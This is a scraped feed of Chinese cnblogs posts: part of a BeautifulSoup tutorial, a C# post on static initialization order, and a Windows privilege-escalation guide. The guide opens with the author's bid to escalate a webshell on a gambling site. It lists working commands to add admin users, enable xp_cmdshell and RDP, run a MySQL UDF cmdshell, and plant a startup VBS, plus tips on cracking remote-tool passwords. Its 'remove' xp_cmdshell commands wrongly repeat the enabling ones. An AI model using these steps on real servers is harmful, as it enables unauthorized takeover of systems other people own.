&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,class_=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;sister&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 查找类为sister的a标签&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,class_=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;sister ssss&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 查找类为sister和sss的a标签，顺序错误也匹配不成功&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all(class_=re.compile(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^sis&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;))) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 查找类为sister的所有标签&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;3、attrs&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;p&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,attrs={&lt;span&gt;'&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;story&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;}))
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;4、text&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;值可以是：字符，列表，True，正则&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all(text=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Elsie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,text=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Elsie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;))
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;5、limit参数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果文档树很大那么搜索会很慢.如果我们不需要全部结果,可以使用 limit 参数限制返回结果的数量.效果与SQL中的limit关键字类似,当搜索到的结果数量达到 limit 的限制时,就停止搜索返回结果&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,limit=2))
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;6、recursive&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;调用tag的 find_all() 方法时,Beautiful Soup会检索当前tag的所有子孙节点,如果只想搜索tag的直接子节点,可以使用参数 recursive=False .&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;print&lt;/span&gt;(soup.html.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(soup.html.find_all(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,recursive=False))
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;tag&lt;/h3&gt;
&lt;p&gt;像调用 find_all() 一样调用tag find_all() 几乎是Beautiful Soup中最常用的搜索方法,所以我们定义了它的简写方法. BeautifulSoup 对象和 tag 对象可以被当作一个方法来使用~&lt;/p&gt;
&lt;p&gt;这个方法的执行结果与调用这个对象的 find_all() 方法相同~&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 下面两行代码是等价的:&lt;/span&gt;
soup.find_all(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
soup(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 这两行代码也是等价的:&lt;/span&gt;
soup.title.find_all(text=&lt;span&gt;True)
soup.title(text&lt;/span&gt;=True)
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;find&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;find( name , attrs , recursive , text , **kwargs )&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;find_all() 方法将返回文档中符合条件的所有tag,尽管有时候我们只想得到一个结果.比如文档中只有一个&amp;lt;body&amp;gt;标签,那么使用 find_all() 方法来查找&amp;lt;body&amp;gt;标签就不太合适, 使用 find_all 方法并设置 limit=&lt;span class=&quot;hljs-number&quot;&gt;1 参数不如直接使用 find() 方法&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;下面两行代码是等价的:

soup.find_all(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, limit=1&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; [&amp;lt;title&amp;gt;The Dormouse's story&amp;lt;/title&amp;gt;]&lt;/span&gt;
soup.find(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; &amp;lt;title&amp;gt;The Dormouse's story&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;唯一的区别是 find_all() 方法的返回结果是值包含一个元素的列表,而 find() 方法直接返回结果.&lt;br/&gt;find_all() 方法没有找到目标是返回空列表, find() 方法找不到目标时,返回 None .&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;print&lt;/span&gt;(soup.find(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;nosuchtag&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; None&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;soup.head.title 是 tag的名字 方法的简写.这个简写的原理就是多次调用当前tag的 find() 方法:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;soup.head.title
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; &amp;lt;title&amp;gt;The Dormouse's story&amp;lt;/title&amp;gt;&lt;/span&gt;
soup.find(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;head&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;).find(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;title&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; &amp;lt;title&amp;gt;The Dormouse's story&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

</description>
<pubDate>Thu, 24 Jan 2019 15:42:00 +0000</pubDate>
<dc:creator>温而新</dc:creator>
<og:description>一，正则表达式解析 re正则就不写了，前面已经写入一篇很详细的正则表达式模块了~ 而且，在爬虫中，下面两种方式用的多一些~ 正则表达式：https://www.cnblogs.com/peng104/</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/peng104/p/10317601.html</dc:identifier>
</item>
<item>
<title>C# 静态构造函数，静态变量执行顺序（升华版） - 凯帝农垦</title>
<link>http://www.cnblogs.com/wwkk/p/10317476.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wwkk/p/10317476.html</guid>
<description>&lt;p&gt;上篇 是基本语法基础下的执行顺序，包括继承这个维度下的执行顺序，我们可以依照的规律顺下来，下面我们看下一些摸不到头脑的情况&lt;/p&gt;
&lt;p&gt;我们实验 一个 类中的方法 去调用另一个非继承类的情况，  我们主要看下  静态构造函数 和没有静态构造函数执行顺序上的差别&lt;/p&gt;


&lt;pre&gt;
&lt;code&gt;
 class Program
    {
        static void Main(string[] args)
        {                                           //执行顺序5         
            var de = new People(&quot;2&quot;);               //执行顺序6     
            People.Instance.OutDemo();              //执行顺序8


            Console.ReadKey();                     //执行顺序10
        }

    }

    public class People
    {
        public void OutDemo()                       
        {                                       //执行顺序9
            Console.WriteLine($&quot;HaHa&quot;);
        }

        public static readonly People Instance = new People();        //执行顺序1


        public static Action Inssstance = () =&amp;gt; { Console.WriteLine(&quot;11&quot;); };      //执行顺序4

        private People()                       
        {                                      //执行顺序2
            Console.WriteLine(3);               //执行顺序3
        }

        public People(string ss)                  
        {                                     //执行顺序7
          
        }
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;执行顺序 大致是上面十个步骤， 是不是感觉有点蒙蔽了，首先刚开始就没进Main函数，跳到 People下面了，好吧，我们暂且给自己一个说服自己的理由，如果方法中有直接调另一个类的静态成员的，先去走到另一个类中去初始化去.&lt;br/&gt;ok, 接下来 执行顺序1 中赋值的时候 调的 new People()，然后到 执行顺序2 里面， 而另一个静态的 执行顺序4 在执行顺序3走完 随后 ，这个也可以理解，谁让执行顺序2 人家 赋值的时候 调的构造函数呢，然后执行顺序4走完 ok，没有静态的了，调回到原 Program里的main方法了，这个和上篇讲的静态走完再走非静态的不一样，这个也可以理解，谁让两个类不是继承的呢，到Program的Main后 继续 5 、6、7、 8、9、10，这个顺序没有异议。&lt;br/&gt;ok，我们似乎给了自己一个完美的解释。先别高兴的太早，接下来，我们一步步走起，我们再做一件事情：&lt;br/&gt;我们给program定义一个静态构造函数。然后再看下顺序会是什么样的：&lt;/p&gt;

&lt;pre&gt;
&lt;code&gt;
 class Program
    {
        static Program()
        {                                  //然后执行

        }

        static void Main(string[] args)
        {
         
             var de = new People(&quot;2&quot;);
            People.Instance.OutDemo();


            Console.ReadKey();                     //执行顺序10
        }

        public static string sdds = &quot;sdds&quot;;          //最先执行
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们加了个静态字段，又加了个静态构造函数， 整个顺序： 最先执行 ，然后执行 ，执行顺序1，执行顺序2,......&lt;/p&gt;
&lt;p&gt;没有问题，和上片的知识体系相符，没啥惊喜&lt;/p&gt;
&lt;p&gt;既然Program下没什么东东，我们就整下 People类吧，我们也给People类加个静态构造函数，现在看看：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;
class Program
    {
        static Program()
        {                                  //然后执行

        }

        static void Main(string[] args)
        {                                执行顺序1
            
             var de = new People(&quot;2&quot;);    执行顺序2
            People.Instance.OutDemo();     //执行顺序8


            Console.ReadKey();
        }

        public static string sdds = &quot;sdds&quot;;          //最先执行
    }

 public class People
    {

        static People()
        {              //执行顺序7          

        }

        public void OutDemo()                       
        {                                       //执行顺序9
            Console.WriteLine($&quot;HaHa&quot;);
        }

        public static readonly People Instance = new People();        //执行顺序3


        public static Action Inssstance = () =&amp;gt; { Console.WriteLine(&quot;11&quot;); };      //执行顺序6

        private People()                       
        {                                      //执行顺序4
            Console.WriteLine(3);               //执行顺序5
        }

        public People(string ss)                  
        {                                     //执行顺序7
          
        }
    }

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;眼尖的你发现 给People加了个静态构造函数，现在顺序变成了： 最先执行，然后执行，执行顺序1，执行顺序2，执行顺序3，....，发现 Program静态走完后，走进去Main方法了，不是先进People了。&lt;/p&gt;
&lt;p&gt;啊，匪夷所思，那么没关系，我们自解惑的思想继续改造。我们在先前的一个思想上再加个情况，如果一个类A中去调用另一个类B的静态成员，如果类B有定义了静态的构造函数，那么我们就按顺序走，不会先预先跑到B中初始化B的静态相关的。只到代码碰到B的地方，再去B中走静态相关的部分。&lt;/p&gt;
&lt;p&gt;ok，好像我们的理论又成熟了一步，我们在看看，还有什么意外不&lt;/p&gt;
&lt;p&gt;又来了一个新点子去验证下，如果我们在People中，在初始化静态成员的时候，再去调第三个类的静态成员呢：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;
.....

 public static readonly People Instance = new People();        //执行顺序3


  public static Action Inssstance = () =&amp;gt; { Console.WriteLine(&quot;11&quot;); };      //执行顺序7

 private People()                       
        {                  //执行顺序5
            var d=  Money.Count      //执行顺序6                             
            Console.WriteLine(3);               
        }


........


 public class Money
    {                            
        public static int Count= &quot;4&quot;;        //执行顺序4
    }

......


&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们发现相关顺序仔细捋下来好像没有什么意外， 执行顺序 3 后 会去调 new People 调这个方法的时候，我们先有个预判断，发现这个方法里面有个调用第三个类Money的静态成员，而第Money又没有定义静态构造函数，嗯，符合跳转的条件 ，然后 到了 执行顺序4 ， 然后是执行顺序5 ，然后是执行顺序6 ，执行顺序7&lt;/p&gt;
&lt;p&gt;接下来，迫不及待的给Money加个静态构造函数&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;
.....

   static People()
        {          //执行顺序10

        }

 public static readonly People Instance = new People();        //执行顺序3


  public static Action Inssstance = () =&amp;gt; { Console.WriteLine(&quot;11&quot;); };      //执行顺序9

 private People()                       
        {                  //执行顺序4
            var d=  Money.Count      //执行顺序5                            
            Console.WriteLine(3);   //执行顺序8                 
        }


........


 public class Money
    {    
       static Money()
        {                  //执行顺序7

        }
                        
        public static int Count= &quot;4&quot;;        //执行顺序6
    }

......


&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;依然符合。结论依然牢固&lt;/p&gt;
&lt;p&gt;还要继续玩吗，继续新的怀疑&lt;/p&gt;
&lt;p&gt;如果我们把不被别的地方调的静态成员变成私有的呢，会不会影响顺序了，这个我这里就不列了，答案是：不会&lt;/p&gt;
&lt;p&gt;继续，总觉的还有没有挖掘的东西需要一探究竟&lt;/p&gt;
&lt;p&gt;我们突然发现，上面我们调的都是另一个类的静态字段，如果是调的另一个类的静态方法呢，会不会也是这个规律呢&lt;/p&gt;
&lt;p&gt;改造起来&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;
class Program
    {
        static Program()
        {                                  //然后执行

        }

        static void Main(string[] args)
        {                                执行顺序1
            
            // var de = new People(&quot;2&quot;);    
            //People.Instance.OutDemo();     
              People.xixi();             //执行顺序2

            Console.ReadKey();            //执行顺序8
        }

        public static string sdds = &quot;sdds&quot;;          //最先执行
    }

 public class People
    {

        public static string xixi()
        {                           //执行顺序7
            return &quot;xixi&quot;;
        }

        public void OutDemo()                       
        {                                      
            Console.WriteLine($&quot;HaHa&quot;);
        }

        public static readonly People Instance = new People();        //执行顺序3


        public static Action Inssstance = () =&amp;gt; { Console.WriteLine(&quot;11&quot;); };      //执行顺序6

        private People()                       
        {                                      //执行顺序4
            Console.WriteLine(3);               //执行顺序5
        }

        public People(string ss)                  
        {                                    
          
        }
    }

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;简单测试发现，好像直接调另一个类的静态方法没有符合上面的规律，而是符合常规的规律,不过People加不加静态构造函数，都不会有我们发现的”预先跳转“，它和调用另一个类的静态字段不一样，就调用另一类的静态字段有这个特殊性预先跳转，具体大家可以测试下&lt;/p&gt;
&lt;p&gt;如果我们在调用的时候再加上调用People那个静态字段，那效应就会出来了：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;
.......

 static void Main(string[] args)
        {                              
            
             People.xixi();  
            People.Instance.OutDemo();     //有这个 就会先判断People有没有静态构造函数，来决定是否在进main方法前先 预先跳转


            Console.ReadKey();
        }

......&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果对调用层做个包装呢&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;

....
  static void Main(string[] args)
        {                  //执行顺序1
            dtas();       //执行顺序2
       // Console.WriteLine(People.Instance.OutDemo());
            Console.ReadKey();
        }

        public static void dtas()
        {                          //执行顺序4
            People.Instance.OutDemo();
        }

.......



//假设People没有静态构造函数

......

 //public static readonly People Instance = new People();      //执行顺序3

....
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果也符合，进main方法了，在进dtas（）方法时进行了预先判断,注意，方法的包一层，我注释的：Console.WriteLine(People.Instance.OutDemo());其实和 datas()是一个效果，都是包了一层，不要反应不过来哟&lt;/p&gt;
&lt;p&gt;然后，我们对People的静态字段再改下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;
......

   static void Main(string[] args)
        {                                执行顺序2
            
           People.Instance().OutDemo();    执行顺序3

            Console.ReadKey();            //执行顺序7
        }

      
 
.......

//假设People没有静态构造函数

......

 //public static readonly People Instance = new People();   
   //换成下面这中     
  public static readonly Func Instance = () =&amp;gt; {         执行顺序1  
            return new People();          执行顺序4
        };


      public void OutDemo()                       
        {                                 执行顺序5       
            Console.WriteLine($&quot;HaHa&quot;);    执行顺序6     
        }

.......

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们发现这个调用静态字段如果用委托的方式，会到 Instance这个没错，但是 字段的赋值部分（return new People()）就在后期真正调的时候执行了，这个大家注意下这点&lt;/p&gt;
&lt;p&gt;在最后给大家一个层次多点的例子，或许你们会吐槽哪有这么写代码的，现实情况下也不这么调啊，一点都不实际，其实还真有场景有可能这么调的，这只是一个映射现实代码的一个 简单的demo原型而已。你们能捋通下面的了吗？再试着给Middle加个静态构造函数呢？你们可以试试，我就不展示了&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;
 class Class1
    {

        static void Main(string[] args)
        {                                 //执行顺序 6
            var obj = People.Instance;     //执行顺序 7

            Console.Read();         //执行顺序 8
        }
    }


    public class People
    {
        public static readonly ZIS2 Instance = Middle.mid;  //执行顺序 4

        public static string dsds = &quot;sdd&quot;;    //执行顺序 5
    }


    public class Middle
    {
        public static ZIS2 mid = ZIS2.Instance;    //执行顺序 3


    }

    public class ZIS2
    {
        public static ZIS2 Instance = new ZIS2();   //执行顺序 1

        private ZIS2()
        {                          //执行顺序 2

        }
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;到现在为止，我们就暂且告一段落了，当然最后声明下，上面的这些测试都是一次调用的情况，我们想大家应该知道。如果之后发现还有什么神奇的事情，再一一展示吧&lt;/p&gt;
&lt;p&gt;其实，上面说了那么一大堆，这个现象的原理是什么，编译器编译后他们都有什么不同呢，我现在正在研究中，如果大家有什么号的见解可以留言提前告知下&lt;/p&gt;
</description>
<pubDate>Thu, 24 Jan 2019 15:04:00 +0000</pubDate>
<dc:creator>凯帝农垦</dc:creator>
<og:description>C# 静态构造函数，静态变量执行顺序</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wwkk/p/10317476.html</dc:identifier>
</item>
<item>
<title>windows提权总结 - v01cano</title>
<link>http://www.cnblogs.com/v01cano/p/10317458.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/v01cano/p/10317458.html</guid>
<description>&lt;p&gt;0，起因，由于前几天拿了一个菠菜站的webshell，但是只有iis权限，执行无法创建用户等操作，更无法对整个服务器进行控制了，于是此时便需要提权了，对于一个刚刚入门的小白来说，此刻真正意识到了提权的重要性，于是便开始学习提取相关知识，以拿下该菠菜的站点。&lt;/p&gt;
&lt;h2 id=&quot;提权前的准备工作&quot;&gt;提权前的准备工作&lt;/h2&gt;
&lt;p&gt;1，通常来说，不同的脚本所处的权限是不一样的。这就意味着，如果该站点支持权限更高的脚本，我们可以上传该权限更高的脚本的大马，进而拿到更高的权限。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;asp/php 通常为匿名权限(网络服务权限)&lt;/li&gt;
&lt;li&gt;aspx 通常为user权限&lt;/li&gt;
&lt;li&gt;jsp 通常为系统权限&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;2，提权中常常也需要进行信息收集：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;内外网&lt;/li&gt;
&lt;li&gt;服务器系统和版本位数&lt;/li&gt;
&lt;li&gt;服务器的补丁情况&lt;/li&gt;
&lt;li&gt;服务器的安装软件情况&lt;/li&gt;
&lt;li&gt;服务器的防护软件情况&lt;/li&gt;
&lt;li&gt;端口情况&lt;/li&gt;
&lt;li&gt;所支持的脚本情况&lt;/li&gt;
&lt;li&gt;...............................等等&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;3，windows信息收集中常用的命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ipconfig /all    查看当前ip
net user         查看当前服务器账号情况
netstat -ano     查看当前服务器端口开放情况
ver              查看当前服务器操作系统
systeminfo       查看当前服务器配置信息（补丁情况）
tasklist /svc    查看当前服务器进程情况
taskkill -pid pid号  结束某个pid号的进程
taskkill /im qq.exe /f 结束qq进程，如果对命令不清楚，可以使用taskkill /? 进行查看
net user v01cano v01cano /add 添加一个用户名为v01cano密码为v01cano的用户
net localgroup administrators v01cano /add 将用户v01cano添加到管理员组
whoami                   查看当前操作用户（当前权限） &lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;cmd命令执行提权&quot;&gt;cmd命令执行提权&lt;/h2&gt;
&lt;p&gt;cmd命令执行提权-拿到webshell后，通常是无法执行cmd命令的，常见的阻断cmd命令执行有如下三种：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;防护软件拦截&lt;/li&gt;
&lt;li&gt;cmd被降权&lt;/li&gt;
&lt;li&gt;组件被删除&lt;/li&gt;
&lt;li&gt;被拦截和降权的解决方案，找可读写目录，上传cmd.exe，调用自己上传的cmd.exe，执行cmd命令。&lt;/li&gt;
&lt;li&gt;组件被删除解决方案：检查是否支持aspx，如果支持，则可以通过aspx直接调用系统的cmd命令。或者换个脚本试试，比如换个php或者asp的大马试试。&lt;/li&gt;
&lt;li&gt;https://www.cnblogs.com/v01cano/p/10293838.html&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;ftp软件提权&quot;&gt;FTP软件提权：&lt;/h2&gt;
&lt;p&gt;常见的FTP软件有server-u，g6ftp，filezilla等等。&lt;/p&gt;
&lt;p&gt;https://www.cnblogs.com/v01cano/p/10310822.html&lt;/p&gt;
&lt;h2 id=&quot;远程管理软件提权&quot;&gt;远程管理软件提权：&lt;/h2&gt;
&lt;p&gt;常见的远程管理软件有teamviewer，pcanywhere，radmin，vnc等等。&lt;/p&gt;
&lt;p&gt;1，teamviewer提权：比较难，官方响应更新较快。&lt;/p&gt;
&lt;p&gt;2，pcanywhere提权：（默认端口5631,5632）一般下载安装根目录下的hosts文件夹下的PCA.admin.CIF文件，然后使用pcanywhere破解.exe可执行程序读取其用户名和密码，然后即可进行连接远控。&lt;/p&gt;
&lt;p&gt;3，radmin提权：（默认端口4899）直接使用大马中的Radmin提权，可以直接读取Radmin的密码（密文），同样使用工具radmin_hash.exe直接新建连接，然后右键完全控制，将32位的hash密文直接输入即可（注：在大马里面获取的密文为大写，需要先进行小写转换）&lt;/p&gt;
&lt;p&gt;4，vnc提权：@1，通过读取注册表的十进制数，将其转换成十六进制数。（使用大马中读取注册表选项，选择vnc4密码选项，进行读取）@2，使用工具vncx4.exe破解十六进制数后得到密码，即首先输入vncx4.exe -W回车，然后将转换后的十六进制数依次输入。@3，使用破解得到的密码连接vnc。&lt;/p&gt;
&lt;h2 id=&quot;windows溢出提权&quot;&gt;windows溢出提权：&lt;/h2&gt;
&lt;p&gt;主要是通过windows漏洞利用来获取系统权限，常见的溢出提权有巴西烤肉，pr等。&lt;/p&gt;
&lt;p&gt;提权步骤如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;通过systeminfo命令查看服务器打了哪些补丁。&lt;/li&gt;
&lt;li&gt;根据未打补丁的漏洞进行利用即可。可以通过getroot tools工具进行查看有哪些漏洞未打补丁。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;破解hash提权&quot;&gt;破解hash提权：&lt;/h2&gt;
&lt;p&gt;前提：需要system权限。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;上传pwdunp7.exe运行获取hash值或者使用pass.exe读取内存中的明文密码。&lt;/li&gt;
&lt;li&gt;拿到lc5，彩虹表或者cmd5中解密&lt;/li&gt;
&lt;li&gt;即可得到管理员密码&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;启动项提权&quot;&gt;启动项提权：&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;前提写入的目录需要写入权限&lt;/li&gt;
&lt;li&gt;将批处理文件上传到开启启动项目录等待管理员重启即可。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;数据库提权&quot;&gt;数据库提权：&lt;/h2&gt;
&lt;h3 id=&quot;sqlserver数据库提权&quot;&gt;sqlserver数据库提权&lt;/h3&gt;
&lt;p&gt;1，首先需要获取sa账号，或者其他管理员账号。获取方法，查看config.asp，conn.asp，database.asp等文件。&lt;/p&gt;
&lt;p&gt;2，安装cmd_shell组件&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  执行如下命令安装cmd_shell组件，默认无法直接执行cmd命令：
  EXEC sp_configure 'show advanced options', 1
  GO
  RECONFIGURE
  GO
  EXEC sp_configure 'xp_cmdshell', 1
  GO
  RECONFIGURE
  GO
  删除cmd_shell组件：
  EXEC sp_configure 'show advanced options', 1
  GO
  RECONFIGURE
  GO
  EXEC sp_configure 'xp_cmdshell', 1
  GO
  RECONFIGURE
  GO
  如果在添加用户到管理员组administrators的时候遇到安全狗而无法添加，则可以添加用户到Remote desktop Users远程组，远程组的用户同样可以进行远程连接。&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;3，开启3389&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;开启3389的sql语句：
exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;
关闭3389的sql语句：
exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',1;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;4，创建用户，加入到administrators组或者Remote desktop Users组&lt;/p&gt;
&lt;h3 id=&quot;mysql数据库提权&quot;&gt;mysql数据库提权&lt;/h3&gt;
&lt;p&gt;前提：需要是数据库管理员权限才可以进行提权操作。&lt;/p&gt;
&lt;h4 id=&quot;一udf提权&quot;&gt;一，udf提权&lt;/h4&gt;
&lt;p&gt;1，获取到对方mysql数据库下的root账号和密码，常用的获取方法有：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;查看网站源码里面的数据库配置文件（inc,conn,config.sql,common,data等）&lt;/li&gt;
&lt;li&gt;查看数据库安装路径下的user.myd(/data/mysql/)&lt;/li&gt;
&lt;li&gt;暴力破解mysql密码，破解3306端口入侵。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;2，udf提权原理：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;通过root权限导出udf.dll到系统目录下，可以通过udf.dll调用执行cmd。
create function cmdshell returns string soname 'udf.dll' 
select cmdshell('net user iis_user 123!@#abcABC /add'); 
select cmdshell('net localgroup administrators iis_user /add'); 
drop function cmdshell;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;3，udf提权常用方法：&lt;/p&gt;
&lt;p&gt;直接上传udf大马，对如上命令进行自动执行，从而达到提权的目的。&lt;/p&gt;
&lt;h4 id=&quot;二启动项提权&quot;&gt;二，启动项提权&lt;/h4&gt;
&lt;p&gt;启动项提权原理：使用较少&lt;br/&gt;1，查看数据库中有些什么数据表&lt;br/&gt;mysql&amp;gt;show tables;&lt;br/&gt;默认的情况下，test中没有任何表的存在。&lt;br/&gt;2，在test数据库下创建一个新的表；&lt;br/&gt;mysql&amp;gt;create table a(cmd text);&lt;br/&gt;我们创建了一个新的表，表名为a，表中只存放一个字段，字段名为cmd,为test文本。&lt;br/&gt;3，在表中插入新的内容：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;insert into a values(“set wshshell=createobject(“”wscript.shell””)”);
insert into a values(“a=wshshell.run(“”cmd.exe /c net user v01cano v01cano /add“”,0)”);
insert into a values(“b=wshshell.run(“”cmd.exe /c net localgroup administrators v01cano /add“”,0)”);
select * from a into outfile “C://docume~1//「开始」菜单//程序//启动//a.vbs”;
重启即可创建该用户。&lt;/code&gt;
